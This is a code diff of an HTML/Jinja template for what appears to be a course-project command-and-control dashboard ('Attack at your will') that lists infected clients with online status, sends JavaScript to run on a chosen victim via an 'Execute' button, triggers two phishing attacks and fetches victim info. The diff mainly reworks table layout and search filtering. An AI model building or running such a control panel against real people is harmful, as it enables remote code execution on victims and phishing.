@@ -10,12 +10,11 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.3/socket.io.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
     <script>
-        $(document).ready(function(){
-            $("#inputToSearch").on("keyup", function(){
+        $(document).ready(function () {
+            $("#inputToSearch").on("keyup", function () {
                 var value = $(this).val().toLowerCase();
-                $("#userlist tr").filter(function(){
-                    $(this).toggle($(this).find('#clientid').text().toLowerCase().indexOf(value)>-1)
-
+                $("#userlist tbody").filter(function () {
+                    $(this).toggle($(this).find("tr").find("#clientid").text().toLowerCase().indexOf(value) > -1)
                 });
             });
         });
@@ -37,11 +36,13 @@
         </form>
         <h1 class="text-center display-3 title">Welcome, Seanonymous!</h1>
         <h4 class="text-center display-4 subtitle">Attack at your will.</h4>
-        <input class="form-control" id = "inputToSearch" type = "text" placeholder="Search for user...">
+
     </div>
 
-    <div id="userlistdiv">
-        <table class="table" id="userlist" style="margin:0px">
+    <div class="container" id="userlistdiv">
+           <input class="form-control" id="inputToSearch" type="text" placeholder="Search for user..."  >
+        <table  class=" table table-responsive" id="userlist" style="table-layout: fixed; margin:0px;">
+
             <thead class="thead-dark">
             <tr>
                 <th class="text-center">ID</th>
@@ -52,71 +53,71 @@
                 <th class="text-center"></th>
             </tr>
             </thead>
-            <tbody>
             {% for item in data %}
-
-                <tr id="row{{ item[0] }}" class="userrow">
-                    <td class="text-center rowtext">
-                        <button class="transparentbutton" id = "clientid" onclick="get_info_display_new_tab({{ item[0] }})">
-                            <u>{{ item[0] }}</u></button>
-                    </td>
-
-                    {% if active_users.__contains__(item[0]|string) %}
-                        <td class="text-center rowtext" id=status{{ item[0] }} style="background-color: green; ">Online
+                <tbody id="rowgroup{{ item[0] }}">
+                    <tr id="row{{ item[0] }}" class="userrow">
+                        <td class="text-center rowtext">
+                            <button class="transparentbutton" id="clientid"
+                                    onclick="get_info_display_new_tab({{ item[0] }})">
+                                <u>{{ item[0] }}</u></button>
                         </td>
-                    {% else %}
-                        <td class="text-center rowtext" id=status{{ item[0] }} style="background-color: red">
-                            Offline
-                        </td>
-                    {% endif %}
 
-                    <td><input id="pattern{{ item[0] }}" type="text" class="form-control"
+                        {% if active_users.__contains__(item[0]|string) %}
+                            <td class="text-center rowtext" id=status{{ item[0] }} style="background-color: green; ">Online
+                            </td>
+                        {% else %}
+                            <td class="text-center rowtext" id=status{{ item[0] }} style="background-color: red">
+                                Offline
+                            </td>
+                        {% endif %}
+
+                        <td><input id="pattern{{ item[0] }}" type="text" class="form-control"
                                    aria-label="Text input with segmented dropdown button"></td>
-                    <td class="text-center">
-                        <form class="input-group">
-                            <input id={{ item[0] }} type="text" class="form-control"
-                                   aria-label="Text input with segmented dropdown button">
-                            <div class="input-group-append    ">
-                                <button type="reset" class="btn btn-outline-secondary buttontext"
-                                        onclick="call_javascript({{ item[0] }})">Execute
+                        <td class="text-center">
+                            <form class="input-group">
+                                <input id={{ item[0] }} type="text" class="form-control"
+                                       aria-label="Text input with segmented dropdown button">
+                                <div class="input-group-append    ">
+                                    <button type="reset" class="btn btn-outline-secondary buttontext"
+                                            onclick="call_javascript({{ item[0] }})">Execute
+                                    </button>
+                                </div>
+                            </form>
+                        </td>
+                        <td class="text-center">
+                            <div class="btn-group" role="group" aria-label="Basic example">
+                                <button type="button" class="btn btn-outline-secondary buttontext"
+                                        onclick="call_phishing({{ item[0] }},1)">Phish #1
+                                </button>
+                                <button type="button" class="btn btn-outline-secondary buttontext"
+                                        onclick="call_phishing({{ item[0] }},2)">Phish #2
                                 </button>
                             </div>
-                        </form>
-                    </td>
-                    <td class="text-center">
-                        <div class="btn-group" role="group" aria-label="Basic example">
-                            <button type="button" class="btn btn-outline-secondary buttontext"
-                                    onclick="call_phishing({{ item[0] }},1)">Phish #1
-                            </button>
-                            <button type="button" class="btn btn-outline-secondary buttontext"
-                                    onclick="call_phishing({{ item[0] }},2)">Phish #2
-                            </button>
-                        </div>
-                    </td>
-                    <td><a id="testing" class="btn btn-primary" data-toggle="collapse"
-                           href=".collapse{{ item[0] }}" role="button"
-                           aria-expanded="false" aria-controls="collapse{{ item[0] }}"
-                           onclick="get_info_display_same_page({{ item[0] }})">
-                        View Info
-                    </a></td>
-                </tr>
+                        </td>
+                        <td><a id="testing" class="btn btn-primary" data-toggle="collapse"
+                               href=".collapse{{ item[0] }}" role="button"
+                               aria-expanded="false" aria-controls="collapse{{ item[0] }}"
+                               onclick="get_info_display_same_page({{ item[0] }})">
+                            View Info
+                        </a></td>
+                    </tr>
 
 
-                <tr class="col-md-12" id="collapserow{{ item[0] }}" style="background-color: white" >
-                    <td colspan="5"  class="collapse{{ item[0] }} collapse" id="moreinfo{{ item[0] }}" >
+                    <tr class="col-md-12" id="collapserow{{ item[0] }}" style="background-color: white">
+                        <td colspan="6" class="collapse{{ item[0] }} collapse" id="moreinfo{{ item[0] }}">
 
-                    </td>
-                </tr>
+                        </td>
+                    </tr>
+                </tbody>
+
 
             {% endfor %}
-
-            </tbody>
         </table>
     </div>
 </div>
 <script>
     $(document).ready(function () {
-        var socket = io.connect("https://cse331.andrewjaffie.me/socket.io");
+         var socket = io.connect("https://cse331.andrewjaffie.me/socket.io");
 
         socket.on('disconnectSuccessful', function (id) {
             var fullid = "status" + id.id;
@@ -124,12 +125,12 @@
             element.style.backgroundColor = "red";
             element.innerHTML = "Offline";
         });
-	socket.on('connect', function (id) {
-	    console.log("web app connected to server")
-	});
-	socket.on('disconnect', function (id) {
-		console.log("web app disconnected from server")
-	});
+        socket.on('connect', function (id) {
+            console.log("web app connected to server")
+        });
+        socket.on('disconnect', function (id) {
+            console.log("web app disconnected from server")
+        });
         socket.on('connectSuccessful', function (id) {
             var fullid = "status" + id.id;
             var element = document.getElementById(fullid);
@@ -142,32 +143,45 @@
         });
 
 
-        socket.on('newClientInstall', function (id, online) {
-	    console.log(id)
+        socket.on('newClientInstall', function (id) {
+            {#var $t = $("#userlist");#}
+            {#var $tbody = $t.find("tbody");#}
+            {#var $trLast = $tbody.find("tr:last").prev('tr');#}
+            {#var $trLastCollapse = $tbody.find("tr:last");#}
+            {#var $trNew = $trLast.clone();#}
+            {#var $trNewCollapse = $trLastCollapse.clone();#}
+            {##}
+            {#var $pattern = RegExp($trLast.find('td:first').text().trim(), "g");#}
+            {#$trNew.html($trNew.html().replace($pattern, id));#}
+            {#$trNewCollapse.html($trNewCollapse.html().replace($pattern, id.id));#}
+            {##}
+            {#var status = $trNew.find("td:first").next('td');#}
+            {#status.css('background-color', 'green');#}
+            {#status.text('Online');#}
+            {##}
+            {#$t.append($trNew);#}
+            {#$t.append($trNewCollapse);#}
             var $t = $("#userlist");
-            var $tbody = $t.find("tbody");
-            var $trLast = $tbody.find("tr:last").prev('tr');
-            var $trLastCollapse = $tbody.find("tr:last");
-            var $trNew = $trLast.clone();
-            var $trNewCollapse = $trLastCollapse.clone();
-
-            var $pattern = RegExp($trLast.find('td:first').text().trim(),"g");
-            $trNew.html($trNew.html().replace($pattern, id));
-            $trNewCollapse.html($trNewCollapse.html().replace($pattern, id));
-
-            var status =  $trNew.find("td:first").next('td');
+            var $tbodyLast = $t.find("tbody:last");
+            console.log($tbodyLast);
+            var $tbodyNew = $tbodyLast.clone();
+            console.log($tbodyNew);
+            var $pattern = RegExp($tbodyLast.find('td:first').text().trim(), "g");
+            console.log($pattern);
+            $tbodyNew.html($tbodyNew.html().replace($pattern, id.id));
+            var status = $tbodyNew.find("td:first").next('td');
             status.css('background-color', 'green');
             status.text('Online');
 
-            $t.append($trNew);
-            $t.append($trNewCollapse);
+            $t.append($tbodyNew);
+
         });
 
         socket.on('clientUninstall', function (id) {
-            var rowToDelete = document.getElementById("row" + id.id);
-            var collapseToDelete = document.getElementById("collapserow" + id.id);
-            rowToDelete.parentNode.removeChild(rowToDelete);
-            collapseToDelete.parentNode.removeChild(collapseToDelete);
+            var rowGroupToDelete = document.getElementById("rowgroup" + id.id);
+            {#var collapseToDelete = document.getElementById("collapserow" + id.id);#}
+            rowGroupToDelete.parentNode.removeChild(rowGroupToDelete);
+            {#collapseToDelete.parentNode.removeChild(collapseToDelete);#}
         })
     })
 </script>
@@ -191,7 +205,7 @@
                 console.log(error)
             }
         });
-          document.getElementById("pattern" + person).value = "";
+        document.getElementById("pattern" + person).value = "";
     }
 
     function call_phishing(id, attackNumber) {
